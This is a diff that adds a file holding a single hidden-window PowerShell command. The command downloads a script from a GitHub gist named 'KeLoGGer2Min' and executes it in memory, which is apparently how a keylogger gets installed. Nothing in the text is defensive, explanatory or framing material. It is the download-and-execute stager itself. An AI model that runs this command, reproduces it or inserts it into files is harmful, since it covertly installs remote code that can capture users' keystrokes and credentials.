@@ -1,0 +1,4 @@
+powershell -W hidden IEX(New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/ramapitecusment/f9cdd2423759d714507a4c9b4fbb2cf7/raw/4516c4773d378af6a4e25de0f3d13e3899e15a0f/KeLoGGer2Min')
+
+
+
